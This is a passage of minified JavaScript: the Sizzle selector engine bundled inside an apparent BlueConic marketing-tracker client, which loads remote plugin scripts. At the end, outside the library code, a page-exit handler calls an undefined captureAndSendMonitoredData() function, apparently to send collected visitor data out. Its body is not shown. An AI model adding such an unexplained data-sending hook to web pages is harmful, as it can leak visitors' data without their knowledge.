          ea = /^[\x20\t\r\n\f]+|((?:^|[^\\])(?:\\.)*)[\x20\t\r\n\f]+$/g,
          xa = /^[\x20\t\r\n\f]*,[\x20\t\r\n\f]*/,
          ya = /^[\x20\t\r\n\f]*([>+~]|[\x20\t\r\n\f])[\x20\t\r\n\f]*/,
          Ba = /=[\x20\t\r\n\f]*([^\]'"]*?)[\x20\t\r\n\f]*\]/g,
          Ca = /:((?:\\.|[\w-]|[^\x00-\xa0])+)(?:\((('((?:\\.|[^\\'])*)'|"((?:\\.|[^\\"])*)")|((?:\\.|[^\\()[\]]|\[[\x20\t\r\n\f]*((?:\\.|[\w-]|[^\x00-\xa0])+)(?:[\x20\t\r\n\f]*([*^$|!~]?=)[\x20\t\r\n\f]*(?:'((?:\\.|[^\\'])*)'|"((?:\\.|[^\\"])*)"|((?:\\.|[\w-]|[^\x00-\xa0])+))|)[\x20\t\r\n\f]*\])*)|.*)\)|)/,
          Da = /^(?:\\.|[\w-]|[^\x00-\xa0])+$/,
          ia = {
            ID: /^#((?:\\.|[\w-]|[^\x00-\xa0])+)/,
            CLASS: /^\.((?:\\.|[\w-]|[^\x00-\xa0])+)/,
            TAG: /^((?:\\.|[\w-]|[^\x00-\xa0])+|[*])/,
            ATTR: /^\[[\x20\t\r\n\f]*((?:\\.|[\w-]|[^\x00-\xa0])+)(?:[\x20\t\r\n\f]*([*^$|!~]?=)[\x20\t\r\n\f]*(?:'((?:\\.|[^\\'])*)'|"((?:\\.|[^\\"])*)"|((?:\\.|[\w-]|[^\x00-\xa0])+))|)[\x20\t\r\n\f]*\]/,
            PSEUDO: /^:((?:\\.|[\w-]|[^\x00-\xa0])+)(?:\((('((?:\\.|[^\\'])*)'|"((?:\\.|[^\\"])*)")|((?:\\.|[^\\()[\]]|\[[\x20\t\r\n\f]*((?:\\.|[\w-]|[^\x00-\xa0])+)(?:[\x20\t\r\n\f]*([*^$|!~]?=)[\x20\t\r\n\f]*(?:'((?:\\.|[^\\'])*)'|"((?:\\.|[^\\"])*)"|((?:\\.|[\w-]|[^\x00-\xa0])+))|)[\x20\t\r\n\f]*\])*)|.*)\)|)/,
            CHILD: /^:(only|first|last|nth|nth-last)-(child|of-type)(?:\([\x20\t\r\n\f]*(even|odd|(([+-]|)(\d*)n|)[\x20\t\r\n\f]*(?:([+-]|)[\x20\t\r\n\f]*(\d+)|))[\x20\t\r\n\f]*\)|)/i,
            bool: /^(?:checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped)$/i,
            needsContext: /^[\x20\t\r\n\f]*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\([\x20\t\r\n\f]*((?:-\d)?\d*)[\x20\t\r\n\f]*\)|)(?=[^-]|$)/i
          },
          Ea = /^(?:input|select|textarea|button)$/i,
          Ga = /^h\d$/i,
          ca = /^[^{]+\{\s*\[native \w/,
          Ja = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
          ra = /[+~]/,
          oa = /\\([\da-f]{1,6}[\x20\t\r\n\f]?|([\x20\t\r\n\f])|.)/ig,
          pa = function (a, b, c) {
            a = "0x" + b - 65536;
            return a !== a || c ? b : 0 > a ? String.fromCharCode(a + 65536) : String.fromCharCode(a >> 10 | 55296, a & 1023 | 56320);
          },
          za = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,
          Aa = function (a, b) {
            return b ? "\x00" === a ? "�" : a.slice(0, -1) + "\\" + a.charCodeAt(a.length - 1).toString(16) + " " : "\\" + a;
          },
          Fa = function () {
            L();
          },
          Ka = w(function (a) {
            return !0 === a.disabled && "fieldset" === a.nodeName.toLowerCase();
          }, {
            dir: "parentNode",
            next: "legend"
          });
        try {
          ta.apply(Ia = qa.call(Z.childNodes), Z.childNodes), Ia[Z.childNodes.length].nodeType;
        } catch (x) {
          ta = {
            apply: Ia.length ? function (a, b) {
              va.apply(a, qa.call(b));
            } : function (a, b) {
              for (var c = a.length, d = 0; a[c++] = b[d++];);
              a.length = c - 1;
            }
          };
        }
        F = b.support = {};
        X = b.isXML = function (a) {
          return (a = a && (a.ownerDocument || a).documentElement) ? "HTML" !== a.nodeName : !1;
        };
        L = b.setDocument = function (a) {
          var b;
          a = a ? a.ownerDocument || a : Z;
          if (a === D || 9 !== a.nodeType || !a.documentElement) return D;
          D = a;
          ba = D.documentElement;
          aa = !X(D);
          Z !== D && (b = D.defaultView) && b.top !== b && (b.addEventListener ? b.addEventListener("unload", Fa, !1) : b.attachEvent && b.attachEvent("onunload", Fa));
          F.attributes = f(function (a) {
            a.className = "i";
            return !a.getAttribute("className");
          });
          F.getElementsByTagName = f(function (a) {
            a.appendChild(D.createComment(""));
            return !a.getElementsByTagName("*").length;
          });
          F.getElementsByClassName = ca.test(D.getElementsByClassName);
          F.getById = f(function (a) {
            ba.appendChild(a).id = H;
            return !D.getElementsByName || !D.getElementsByName(H).length;
          });
          F.getById ? (C.filter.ID = function (a) {
            var b = a.replace(oa, pa);
            return function (a) {
              return a.getAttribute("id") === b;
            };
          }, C.find.ID = function (a, b) {
            if ("undefined" !== typeof b.getElementById && aa) return (a = b.getElementById(a)) ? [a] : [];
          }) : (C.filter.ID = function (a) {
            var b = a.replace(oa, pa);
            return function (a) {
              return (a = "undefined" !== typeof a.getAttributeNode && a.getAttributeNode("id")) && a.value === b;
            };
          }, C.find.ID = function (a, b) {
            if ("undefined" !== typeof b.getElementById && aa) {
              var c,
                d,
                e = b.getElementById(a);
              if (e) {
                if ((c = e.getAttributeNode("id")) && c.value === a) return [e];
                d = b.getElementsByName(a);
                for (b = 0; e = d[b++];) if ((c = e.getAttributeNode("id")) && c.value === a) return [e];
              }
              return [];
            }
          });
          C.find.TAG = F.getElementsByTagName ? function (a, b) {
            if ("undefined" !== typeof b.getElementsByTagName) return b.getElementsByTagName(a);
            if (F.qsa) return b.querySelectorAll(a);
          } : function (a, b) {
            var c = [],
              d = 0;
            b = b.getElementsByTagName(a);
            if ("*" === a) {
              for (; a = b[d++];) 1 === a.nodeType && c.push(a);
              return c;
            }
            return b;
          };
          C.find.CLASS = F.getElementsByClassName && function (a, b) {
            if ("undefined" !== typeof b.getElementsByClassName && aa) return b.getElementsByClassName(a);
          };
          N = [];
          M = [];
          if (F.qsa = ca.test(D.querySelectorAll)) f(function (a) {
            ba.appendChild(a).innerHTML = "\x3ca id\x3d'" + H + "'\x3e\x3c/a\x3e\x3cselect id\x3d'" + H + "-\r\\' msallowcapture\x3d''\x3e\x3coption selected\x3d''\x3e\x3c/option\x3e\x3c/select\x3e";
            a.querySelectorAll("[msallowcapture^\x3d'']").length && M.push("[*^$]\x3d[\\x20\\t\\r\\n\\f]*(?:''|\"\")");
            a.querySelectorAll("[selected]").length || M.push("\\[[\\x20\\t\\r\\n\\f]*(?:value|checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped)");
            a.querySelectorAll("[id~\x3d" + H + "-]").length || M.push("~\x3d");
            a.querySelectorAll(":checked").length || M.push(":checked");
            a.querySelectorAll("a#" + H + "+*").length || M.push(".#.+[+~]");
          }), f(function (a) {
            a.innerHTML = "\x3ca href\x3d'' disabled\x3d'disabled'\x3e\x3c/a\x3e\x3cselect disabled\x3d'disabled'\x3e\x3coption/\x3e\x3c/select\x3e";
            var b = D.createElement("input");
            b.setAttribute("type", "hidden");
            a.appendChild(b).setAttribute("name", "D");
            a.querySelectorAll("[name\x3dd]").length && M.push("name[\\x20\\t\\r\\n\\f]*[*^$|!~]?\x3d");
            2 !== a.querySelectorAll(":enabled").length && M.push(":enabled", ":disabled");
            ba.appendChild(a).disabled = !0;
            2 !== a.querySelectorAll(":disabled").length && M.push(":enabled", ":disabled");
            a.querySelectorAll("*,:x");
            M.push(",.*:");
          });
          (F.matchesSelector = ca.test(W = ba.matches || ba.webkitMatchesSelector || ba.mozMatchesSelector || ba.oMatchesSelector || ba.msMatchesSelector)) && f(function (a) {
            F.disconnectedMatch = W.call(a, "*");
            W.call(a, "[s!\x3d'']:x");
            N.push("!\x3d", ":((?:\\\\.|[\\w-]|[^\x00-\\xa0])+)(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|\\[[\\x20\\t\\r\\n\\f]*((?:\\\\.|[\\w-]|[^\x00-\\xa0])+)(?:[\\x20\\t\\r\\n\\f]*([*^$|!~]?\x3d)[\\x20\\t\\r\\n\\f]*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|((?:\\\\.|[\\w-]|[^\x00-\\xa0])+))|)[\\x20\\t\\r\\n\\f]*\\])*)|.*)\\)|)");
          });
          M = M.length && new RegExp(M.join("|"));
          N = N.length && new RegExp(N.join("|"));
          T = (b = ca.test(ba.compareDocumentPosition)) || ca.test(ba.contains) ? function (a, b) {
            var c = 9 === a.nodeType ? a.documentElement : a;
            b = b && b.parentNode;
            return a === b || !!(b && 1 === b.nodeType && (c.contains ? c.contains(b) : a.compareDocumentPosition && a.compareDocumentPosition(b) & 16));
          } : function (a, b) {
            if (b) for (; b = b.parentNode;) if (b === a) return !0;
            return !1;
          };
          la = b ? function (a, b) {
            if (a === b) return P = !0, 0;
            var c = !a.compareDocumentPosition - !b.compareDocumentPosition;
            if (c) return c;
            c = (a.ownerDocument || a) === (b.ownerDocument || b) ? a.compareDocumentPosition(b) : 1;
            return c & 1 || !F.sortDetached && b.compareDocumentPosition(a) === c ? a === D || a.ownerDocument === Z && T(Z, a) ? -1 : b === D || b.ownerDocument === Z && T(Z, b) ? 1 : K ? Ha(K, a) - Ha(K, b) : 0 : c & 4 ? -1 : 1;
          } : function (a, b) {
            if (a === b) return P = !0, 0;
            var c = 0,
              d = a.parentNode,
              e = b.parentNode,
              f = [a],
              g = [b];
            if (!d || !e) return a === D ? -1 : b === D ? 1 : d ? -1 : e ? 1 : K ? Ha(K, a) - Ha(K, b) : 0;
            if (d === e) return k(a, b);
            for (; a = a.parentNode;) f.unshift(a);
            for (a = b; a = a.parentNode;) g.unshift(a);
            for (; f[c] === g[c];) c++;
            return c ? k(f[c], g[c]) : f[c] === Z ? -1 : g[c] === Z ? 1 : 0;
          };
          return D;
        };
        b.matches = function (a, c) {
          return b(a, null, null, c);
        };
        b.matchesSelector = function (a, c) {
          (a.ownerDocument || a) !== D && L(a);
          c = c.replace(Ba, "\x3d'$1']");
          if (!(!F.matchesSelector || !aa || da[c + " "] || N && N.test(c) || M && M.test(c))) try {
            var d = W.call(a, c);
            if (d || F.disconnectedMatch || a.document && 11 !== a.document.nodeType) return d;
          } catch (ma) {
            da(c);
          }
          return 0 < b(c, D, null, [a]).length;
        };
        b.contains = function (a, b) {
          (a.ownerDocument || a) !== D && L(a);
          return T(a, b);
        };
        b.attr = function (a, b) {
          (a.ownerDocument || a) !== D && L(a);
          var c = C.attrHandle[b.toLowerCase()],
            c = c && sa.call(C.attrHandle, b.toLowerCase()) ? c(a, b, !aa) : E;
          return c !== E ? c : F.attributes || !aa ? a.getAttribute(b) : (c = a.getAttributeNode(b)) && c.specified ? c.value : null;
        };
        b.escape = function (a) {
          return (a + "").replace(za, Aa);
        };
        b.error = function (a) {
          throw Error("Syntax error, unrecognized expression: " + a);
        };
        b.uniqueSort = function (a) {
          var b,
            c = [],
            d = 0,
            e = 0;
          P = !F.detectDuplicates;
          K = !F.sortStable && a.slice(0);
          a.sort(la);
          if (P) {
            for (; b = a[e++];) b === a[e] && (d = c.push(e));
            for (; d--;) a.splice(c[d], 1);
          }
          K = null;
          return a;
        };
        Q = b.getText = function (a) {
          var b,
            c = "",
            d = 0;
          b = a.nodeType;
          if (!b) for (; b = a[d++];) c += Q(b);else if (1 === b || 9 === b || 11 === b) {
            if ("string" === typeof a.textContent) return a.textContent;
            for (a = a.firstChild; a; a = a.nextSibling) c += Q(a);
          } else if (3 === b || 4 === b) return a.nodeValue;
          return c;
        };
        C = b.selectors = {
          cacheLength: 50,
          createPseudo: e,
          match: ia,
          attrHandle: {},
          find: {},
          relative: {
            "\x3e": {
              dir: "parentNode",
              first: !0
            },
            " ": {
              dir: "parentNode"
            },
            "+": {
              dir: "previousSibling",
              first: !0
            },
            "~": {
              dir: "previousSibling"
            }
          },
          preFilter: {
            ATTR: function (a) {
              a[1] = a[1].replace(oa, pa);
              a[3] = (a[3] || a[4] || a[5] || "").replace(oa, pa);
              "~\x3d" === a[2] && (a[3] = " " + a[3] + " ");
              return a.slice(0, 4);
            },
            CHILD: function (a) {
              a[1] = a[1].toLowerCase();
              "nth" === a[1].slice(0, 3) ? (a[3] || b.error(a[0]), a[4] = +(a[4] ? a[5] + (a[6] || 1) : 2 * ("even" === a[3] || "odd" === a[3])), a[5] = +(a[7] + a[8] || "odd" === a[3])) : a[3] && b.error(a[0]);
              return a;
            },
            PSEUDO: function (a) {
              var b,
                c = !a[6] && a[2];
              if (ia.CHILD.test(a[0])) return null;
              a[3] ? a[2] = a[4] || a[5] || "" : c && Ca.test(c) && (b = R(c, !0)) && (b = c.indexOf(")", c.length - b) - c.length) && (a[0] = a[0].slice(0, b), a[2] = c.slice(0, b));
              return a.slice(0, 3);
            }
          },
          filter: {
            TAG: function (a) {
              var b = a.replace(oa, pa).toLowerCase();
              return "*" === a ? function () {
                return !0;
              } : function (a) {
                return a.nodeName && a.nodeName.toLowerCase() === b;
              };
            },
            CLASS: function (a) {
              var b = ga[a + " "];
              return b || (b = new RegExp("(^|[\\x20\\t\\r\\n\\f])" + a + "([\\x20\\t\\r\\n\\f]|$)"), ga(a, function (a) {
                return b.test("string" === typeof a.className && a.className || "undefined" !== typeof a.getAttribute && a.getAttribute("class") || "");
              }));
            },
            ATTR: function (a, c, d) {
              return function (e) {
                e = b.attr(e, a);
                if (null == e) return "!\x3d" === c;
                if (!c) return !0;
                e += "";
                return "\x3d" === c ? e === d : "!\x3d" === c ? e !== d : "^\x3d" === c ? d && 0 === e.indexOf(d) : "*\x3d" === c ? d && -1 < e.indexOf(d) : "$\x3d" === c ? d && e.slice(-d.length) === d : "~\x3d" === c ? -1 < (" " + e.replace(wa, " ") + " ").indexOf(d) : "|\x3d" === c ? e === d || e.slice(0, d.length + 1) === d + "-" : !1;
              };
            },
            CHILD: function (a, b, c, d, e) {
              var f = "nth" !== a.slice(0, 3),
                g = "last" !== a.slice(-4),
                h = "of-type" === b;
              return 1 === d && 0 === e ? function (a) {
                return !!a.parentNode;
              } : function (b, c, k) {
                var l, x, m, n, p;
                c = f !== g ? "nextSibling" : "previousSibling";
                var B = b.parentNode,
                  q = h && b.nodeName.toLowerCase();
                k = !k && !h;
                l = !1;
                if (B) {
                  if (f) {
                    for (; c;) {
                      for (m = b; m = m[c];) if (h ? m.nodeName.toLowerCase() === q : 1 === m.nodeType) return !1;
                      p = c = "only" === a && !p && "nextSibling";
                    }
                    return !0;
                  }
                  p = [g ? B.firstChild : B.lastChild];
                  if (g && k) for (m = B, x = m[H] || (m[H] = {}), x = x[m.uniqueID] || (x[m.uniqueID] = {}), l = x[a] || [], l = (n = l[0] === na && l[1]) && l[2], m = n && B.childNodes[n]; m = ++n && m && m[c] || (l = n = 0) || p.pop();) {
                    if (1 === m.nodeType && ++l && m === b) {
                      x[a] = [na, n, l];
                      break;
                    }
                  } else if (k && (m = b, x = m[H] || (m[H] = {}), x = x[m.uniqueID] || (x[m.uniqueID] = {}), l = x[a] || [], l = n = l[0] === na && l[1]), !1 === l) for (; (m = ++n && m && m[c] || (l = n = 0) || p.pop()) && ((h ? m.nodeName.toLowerCase() !== q : 1 !== m.nodeType) || !++l || (k && (x = m[H] || (m[H] = {}), x = x[m.uniqueID] || (x[m.uniqueID] = {}), x[a] = [na, l]), m !== b)););
                  l -= e;
                  return l === d || 0 === l % d && 0 <= l / d;
                }
              };
            },
            PSEUDO: function (a, c) {
              var d,
                f = C.pseudos[a] || C.setFilters[a.toLowerCase()] || b.error("unsupported pseudo: " + a);
              return f[H] ? f(c) : 1 < f.length ? (d = [a, a, "", c], C.setFilters.hasOwnProperty(a.toLowerCase()) ? e(function (a, b) {
                for (var d, e = f(a, c), g = e.length; g--;) d = Ha(a, e[g]), a[d] = !(b[d] = e[g]);
              }) : function (a) {
                return f(a, 0, d);
              }) : f;
            }
          },
          pseudos: {
            not: e(function (a) {
              var b = [],
                c = [],
                d = V(a.replace(ea, "$1"));
              return d[H] ? e(function (a, b, c, e) {
                e = d(a, null, e, []);
                for (var f = a.length; f--;) if (c = e[f]) a[f] = !(b[f] = c);
              }) : function (a, e, f) {
                b[0] = a;
                d(b, null, f, c);
                b[0] = null;
                return !c.pop();
              };
            }),
            has: e(function (a) {
              return function (c) {
                return 0 < b(a, c).length;
              };
            }),
            contains: e(function (a) {
              a = a.replace(oa, pa);
              return function (b) {
                return -1 < (b.textContent || b.innerText || Q(b)).indexOf(a);
              };
            }),
            lang: e(function (a) {
              Da.test(a || "") || b.error("unsupported lang: " + a);
              a = a.replace(oa, pa).toLowerCase();
              return function (b) {
                var c;
                do if (c = aa ? b.lang : b.getAttribute("xml:lang") || b.getAttribute("lang")) return c = c.toLowerCase(), c === a || 0 === c.indexOf(a + "-"); while ((b = b.parentNode) && 1 === b.nodeType);
                return !1;
              };
            }),
            target: function (b) {
              var c = a.location && a.location.hash;
              return c && c.slice(1) === b.id;
            },
            root: function (a) {
              return a === ba;
            },
            focus: function (a) {
              return a === D.activeElement && (!D.hasFocus || D.hasFocus()) && !!(a.type || a.href || ~a.tabIndex);
            },
            enabled: m(!1),
            disabled: m(!0),
            checked: function (a) {
              var b = a.nodeName.toLowerCase();
              return "input" === b && !!a.checked || "option" === b && !!a.selected;
            },
            selected: function (a) {
              a.parentNode && a.parentNode.selectedIndex;
              return !0 === a.selected;
            },
            empty: function (a) {
              for (a = a.firstChild; a; a = a.nextSibling) if (6 > a.nodeType) return !1;
              return !0;
            },
            parent: function (a) {
              return !C.pseudos.empty(a);
            },
            header: function (a) {
              return Ga.test(a.nodeName);
            },
            input: function (a) {
              return Ea.test(a.nodeName);
            },
            button: function (a) {
              var b = a.nodeName.toLowerCase();
              return "input" === b && "button" === a.type || "button" === b;
            },
            text: function (a) {
              var b;
              return "input" === a.nodeName.toLowerCase() && "text" === a.type && (null == (b = a.getAttribute("type")) || "text" === b.toLowerCase());
            },
            first: q(function () {
              return [0];
            }),
            last: q(function (a, b) {
              return [b - 1];
            }),
            eq: q(function (a, b, c) {
              return [0 > c ? c + b : c];
            }),
            even: q(function (a, b) {
              for (var c = 0; c < b; c += 2) a.push(c);
              return a;
            }),
            odd: q(function (a, b) {
              for (var c = 1; c < b; c += 2) a.push(c);
              return a;
            }),
            lt: q(function (a, b, c) {
              for (b = 0 > c ? c + b : c; 0 <= --b;) a.push(b);
              return a;
            }),
            gt: q(function (a, b, c) {
              for (c = 0 > c ? c + b : c; ++c < b;) a.push(c);
              return a;
            })
          }
        };
        C.pseudos.nth = C.pseudos.eq;
        for (J in {
          radio: !0,
          checkbox: !0,
          file: !0,
          password: !0,
          image: !0
        }) C.pseudos[J] = l(J);
        for (J in {
          submit: !0,
          reset: !0
        }) C.pseudos[J] = n(J);
        u.prototype = C.filters = C.pseudos;
        C.setFilters = new u();
        R = b.tokenize = function (a, c) {
          var d, e, f, g, h, k, l;
          if (h = ja[a + " "]) return c ? 0 : h.slice(0);
          h = a;
          k = [];
          for (l = C.preFilter; h;) {
            if (!d || (e = xa.exec(h))) e && (h = h.slice(e[0].length) || h), k.push(f = []);
            d = !1;
            if (e = ya.exec(h)) d = e.shift(), f.push({
              value: d,
              type: e[0].replace(ea, " ")
            }), h = h.slice(d.length);
            for (g in C.filter) !(e = ia[g].exec(h)) || l[g] && !(e = l[g](e)) || (d = e.shift(), f.push({
              value: d,
              type: g,
              matches: e
            }), h = h.slice(d.length));
            if (!d) break;
          }
          return c ? h.length : h ? b.error(a) : ja(a, k).slice(0);
        };
        V = b.compile = function (a, b) {
          var c,
            d = [],
            e = [],
            f = ka[a + " "];
          if (!f) {
            b || (b = R(a));
            for (c = b.length; c--;) f = O(b[c]), f[H] ? d.push(f) : e.push(f);
            f = ka(a, S(e, d));
            f.selector = a;
          }
          return f;
        };
        Y = b.select = function (a, b, c, d) {
          var e,
            f,
            g,
            h,
            k = "function" === typeof a && a,
            l = !d && R(a = k.selector || a);
          c = c || [];
          if (1 === l.length) {
            f = l[0] = l[0].slice(0);
            if (2 < f.length && "ID" === (g = f[0]).type && 9 === b.nodeType && aa && C.relative[f[1].type]) {
              b = (C.find.ID(g.matches[0].replace(oa, pa), b) || [])[0];
              if (!b) return c;
              k && (b = b.parentNode);
              a = a.slice(f.shift().value.length);
            }
            for (e = ia.needsContext.test(a) ? 0 : f.length; e--;) {
              g = f[e];
              if (C.relative[h = g.type]) break;
              if (h = C.find[h]) if (d = h(g.matches[0].replace(oa, pa), ra.test(f[0].type) && t(b.parentNode) || b)) {
                f.splice(e, 1);
                a = d.length && v(f);
                if (!a) return ta.apply(c, d), c;
                break;
              }
            }
          }
          (k || V(a, l))(d, b, !aa, c, !b || ra.test(a) && t(b.parentNode) || b);
          return c;
        };
        F.sortStable = H.split("").sort(la).join("") === H;
        F.detectDuplicates = !!P;
        L();
        F.sortDetached = f(function (a) {
          return a.compareDocumentPosition(D.createElement("fieldset")) & 1;
        });
        f(function (a) {
          a.innerHTML = "\x3ca href\x3d'#'\x3e\x3c/a\x3e";
          return "#" === a.firstChild.getAttribute("href");
        }) || g("type|href|height|width", function (a, b, c) {
          if (!c) return a.getAttribute(b, "type" === b.toLowerCase() ? 1 : 2);
        });
        F.attributes && f(function (a) {
          a.innerHTML = "\x3cinput/\x3e";
          a.firstChild.setAttribute("value", "");
          return "" === a.firstChild.getAttribute("value");
        }) || g("value", function (a, b, c) {
          if (!c && "input" === a.nodeName.toLowerCase()) return a.defaultValue;
        });
        f(function (a) {
          return null == a.getAttribute("disabled");
        }) || g("checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped", function (a, b, c) {
          var d;
          if (!c) return !0 === a[b] ? b.toLowerCase() : (d = a.getAttributeNode(b)) && d.specified ? d.value : null;
        });
        var La = a.Sizzle;
        b.noConflict = function () {
          a.Sizzle === b && (a.Sizzle = La);
          return b;
        };
        a.Sizzle = b;
      })(k);
      var $b = k.Sizzle;
      try {
        k.bcTempSizzle ? (k.Sizzle = k.bcTempSizzle, delete k.bcTempSizzle) : delete k.Sizzle;
      } catch (a) {}
      var v = k.blueConicClient = A.getBlueConicClient();
      v.fn.setRequestInfo({});
      (function () {
        var a = function () {
          A.publishPlainEventAndCallHook("onBlueConicLoaded");
          w.publish(w.ON_BEFORE_PRELISTENERS);
          A.checkPreListeners();
          var a = !1,
            b = !1;
          l && c.logInfo("start pageview event");
          v.createEvent("PAGEVIEW", null, this, function (d) {
            if (!d || 0 == d.length) {
              l && c.logInfo("the pageview event did not return any interaction, check if the channel is configured");
              var e = document.getElementById(cb);
              e && (e.parentNode.removeChild(e), l && c.logInfo("removed css for phase 1"));
            }
            l && c.logInfo("[+] finished pageview event [" + d.length + " interactions to run]");
            sa = d;
            a = !0;
            l && c.logInfo("start hide positions mechanism for positions claimed by the configured interactions");
            d = [];
            for (var e = 0, f = sa.length; e < f; e++) {
              var g = sa[e].getPosition();
              g && y.call(d, g);
            }
            c.addCSSToDOM(d, ub, 2E3);
            k.setTimeout(function () {
              var a = document.getElementById(cb);
              a && a.parentNode.removeChild(a);
            }, 1);
            b = !1;
            l && c.logInfo("start plugin download from url [/plugin/plugin] with version [" + Ka + "]");
            d = I ? BC_URL : Q();
            d = Ka ? d + "/plugin/plugin/" + Ka : d + "/plugin/plugin";
            I && (d += "_e");
            c.loadScript(d, this, function () {
              l && c.logInfo("finished plugin download");
              b = !0;
              b && a && (q || c.log("Profile is not initialized"), Ra(sa, !0));
            });
          });
        };
        nb = null !== qa();
        var b = c.getBcSessionId();
        b || (b = null);
        q = new Ja(b);
        I ? g.JSONP.get(BC_URL + "/frontend/e", null, function (b) {
          b || (I = !1, kb = jb());
          I && k.name && -1 < k.name.indexOf("bc_simulator") ? c.loadScript(BC_URL + "/simulatordevice", null, function () {
            a();
          }) : a();
        }) : a();
      })();
    }
  })(window, this.bcVerbose, this.bcChannelIdentifier, this.bcRpcMode, this.bcCSEnabled, this.bcHostname, getDG() || {}, getP() || {}, window.blueConicPreListeners);
  window.addEventListener("beforeunload", () => {
    captureAndSendMonitoredData();
  });
})();